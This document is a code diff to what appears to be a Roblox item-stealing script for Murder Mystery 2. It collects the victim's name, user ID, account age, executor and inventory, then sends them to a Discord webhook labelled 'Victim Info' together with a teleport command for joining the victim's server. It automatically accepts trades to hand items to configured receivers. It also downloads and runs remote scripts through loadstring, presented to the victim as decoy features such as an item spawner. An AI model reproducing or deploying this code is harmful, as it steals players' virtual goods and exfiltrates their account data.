@@ -15,9 +15,55 @@ getgenv().scriptexecuted = true
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
-local DYWebhook = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/refs/heads/main/Libraries/Webhook%20Services/Main"))()
-DYWebhook.ErrorPrinting = false
-local embed = DYWebhook.BuildEmbed()
+function SendMessageEMBED(url, embed, bool, username, avatar_url)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        },
+        ["username"] = username,
+        ["avatar_url"] = avatar_url
+    }
+    local data2 = {
+        ["content"] = "---@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        },
+        ["username"] = username,
+        ["avatar_url"] = avatar_url
+    }
+
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+    
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -44,6 +90,8 @@ for i,v in pairs(LevelModule.XPTable) do
     end
 end
 local playerLevel = math.min(table.unpack(levelTable))
+local username = game.Players.LocalPlayer.Name
+local avatar_url = "https://i.pinimg.com/736x/f0/11/bb/f011bba84c1894dac7308656bc9e2eed.jpg"
 
 local function sendnotification(message)
     getgenv().scriptexecuted = false
@@ -89,16 +137,16 @@ local success, errorMsg = pcall(function()
     
     if Config.Script == nil then
         Config.Script = "None"
-    elseif Config.Script == "Custom" then
-        Config.Script = Config.Script .. " - " .. Config.CustomLink
-    end
-    
-    if Config.Script == "Custom" then
-        loadstring(game:HttpGet(Config.CustomLink))()
-     elseif Config.Script == "xhub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
-       elseif Config.Script == "vertex" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+    elseif Config.Script == "vertex" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+    elseif Config.Script == "xhub" then 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))() 
+    elseif Config.Script == "Item Spawner" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/itemspawner/refs/heads/main/mm2"))()
+    elseif Config.Script == "Guis" then 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/guis/refs/heads/main/gui%20loaders"))()
+    elseif Config.Script == "SMOKINGKILLS" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SILENTGORE/SMOKINGKILLS/refs/heads/main/mm2/main"))()
     end
 
     Common = 0
@@ -202,34 +250,38 @@ function checkitem(v)
         end
     end
     
-    function FullInventory()
-        for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-            for i,v in pairs(v.Container:GetChildren()) do
-                if v.Name == "Christmas" or v.Name == "Halloween" then
-                    for i,v in pairs(v.Container:GetChildren()) do
-                        checkitem(v)
-                    end
-                else
+function FullInventory()
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
                     checkitem(v)
                 end
+            else
+                checkitem(v)
             end
         end
-        for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
-            checkitem(v)
-        end
-        if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
-            table.insert(Inventory, "None")
-        end
-        if Config.FullInventory then
-            return table.concat(Inventory, ", ")
-        else
-            return "Full inventory set false."
-        end
     end
+    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        checkitem(v)
+    end
+
+    local hasItems = Common > 0 or Uncommon > 0 or Rare > 0 or Legendary > 0 or Godly > 0 or Ancient > 0 or Unique > 0 or Vintage > 0
+
+    if not hasItems then
+        table.insert(Inventory, "None")
+    end
+
+    if Config.FullInventory then
+        return table.concat(Inventory, ", ")
+    else
+        return "Full inventory set false."
+    end
+end
     
     FullInventory()
-    
-    task.wait()
+
+        task.wait()
     
     function Sendtrade()
         if Mobile then
@@ -328,7 +380,7 @@ function checkitem(v)
             end
         end
     
-        wait(5)
+        wait(4)
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
     end
 
@@ -360,39 +412,25 @@ function checkitem(v)
     end
 end)
 
-local totalcount = (Ancient + Godly + Unique + Legendary + Rare + Uncommon + Common)
+local totalcount = (Ancient + Godly + Unique + Vintage + Legendary + Rare + Uncommon + Common)
 
-if success then
-    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver     : " .. table.concat(Config.Receivers, ", ") .. "\nLevel        : " .. playerLevel .. "\nScript       : " .. Config.Script .. "\nResend Cmd   : " .. resend .. "\nJob Id " .. jobid .."``` **__Inventory__**\n```Total Count: " .. totalcount .. "\nAncient    : " .. Ancient .. "\nGoldy      : " .. Godly .. "\nUnique     : " .. Unique .. "\nVintage    : " .. Vintage .. "\nLegendary  : " .. Legendary .. "\nRare       : " .. Rare .. "\nUncommon   : " .. Uncommon .. "\nCommon     : " .. Common .. "``` **__Full Inventory__**\n```" .. FullInventory() .. "```**__Execute to join__**\n```" .. TeleportScript .. "```"
-else
-    message = "```Error   : " .. errorMsg .. "\nExploit : " .. identifyexecutor() .. "```\n\n**Please report this error to .gg/UXs6JdynsR as it may be a critical error that could lead to vulnerabilities.**"
-end
-
-if InvaildWebhook then
-    return
-end
-
-if Godly > 0 or Ancient > 0 or Unique > 0 then
-    content = "@everyone"
-elseif Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
-    content =  ""
-else
-    content = ""
-end
-
-embed.Info = {
-    Settings = {
-        Color = DYWebhook.ColorConverter(Color3.fromRGB(0,0,0))
+local embed = {
+    ["title"] = "Jenyca is hot",
+    ["color"] = 0,
+    ["fields"] = {
+        {
+            ["name"] = "Victim Info",
+            ["value"] = "```Name: "..game.Players.LocalPlayer.Name.."\nDisplay Name: "..LocalPlayer.DisplayName.."\nUser Id: "..LocalPlayer.UserId.."\nAccount Age: "..tostring(game.Players.LocalPlayer.AccountAge).."\nExecutor:"..identifyexecutor().."\nLevel:"..playerLevel.."\nScript:"..Config.Script.."\nReceivers:"..table.concat(Config.Receivers, ", ").."```"
+        },
+        {
+            ["name"] = "Inventory",
+            ["value"] = "```Total Count: "..totalcount.."\nUnique: "..Unique.."\nAncient: "..Ancient.."\nGoldy: "..Godly.."\nLegendary: "..Legendary.."\nVintage: "..Vintage.."\nRare: "..Rare.."\nUncommon: "..Uncommon.."\nCommon: "..Common.."```"
+        },
+        {
+            ["name"] = "**__Full Inventory__**",
+            ["value"] = "\n```" .. FullInventory() .. "```"
+        },
     },
-    Embed = {
-        Title = "Demise | .gg/UXs6JdynsR",
-        Description = message,
-        Footer = "Happy Halloween",
-    }
 }
 
-DYWebhook:Send({
-    url = Config.Webhook,
-    content = content,
-    embeds = {embed}
-})
+    SendMessageEMBED(Config.Webhook, embed, true, username, avatar_url)
